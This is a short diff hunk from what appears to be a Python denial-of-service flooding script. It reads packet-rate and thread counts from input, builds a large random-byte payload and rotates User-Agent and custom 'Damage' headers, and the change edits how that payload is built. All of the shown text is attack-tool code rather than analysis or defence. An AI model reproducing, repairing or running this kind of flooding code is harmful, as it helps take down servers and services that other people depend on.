@@ -36,7 +36,7 @@ pack = int(input("[ ? ] Packet/s < ? >>>>="))
 thread = int(input("[ ? ] Thread/t < ? >>>>="))
 def start():
     global useragents, ref, acceptall
-    hh = random._urandom(9999999)+str(damage)
+    hh =random._urandom(9999999)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     demeg = "Damage: "+random.choice(damage)+str(main_req)+"\r\n"
